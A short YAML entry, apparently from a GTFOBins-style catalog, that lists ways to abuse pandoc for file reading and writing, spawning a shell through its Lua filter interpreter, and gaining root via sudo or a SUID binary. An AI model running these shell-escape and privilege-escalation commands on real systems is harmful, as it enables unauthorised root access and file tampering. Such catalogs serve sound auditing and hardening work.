---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        pandoc -t plain "$LFILE"
  file-write:
    - code: |
        LFILE=file_to_write
        echo DATA | pandoc -t plain -o "$LFILE"
  shell:
    - description: |
        Pandoc has a builtin Lua interpreter for writing filters.
    - code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        pandoc -L $TF /dev/null
  suid:
    - code: |
        LFILE=file_to_write
        echo DATA | ./pandoc -t plain -o "$LFILE"
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        sudo pandoc -L $TF /dev/null
---
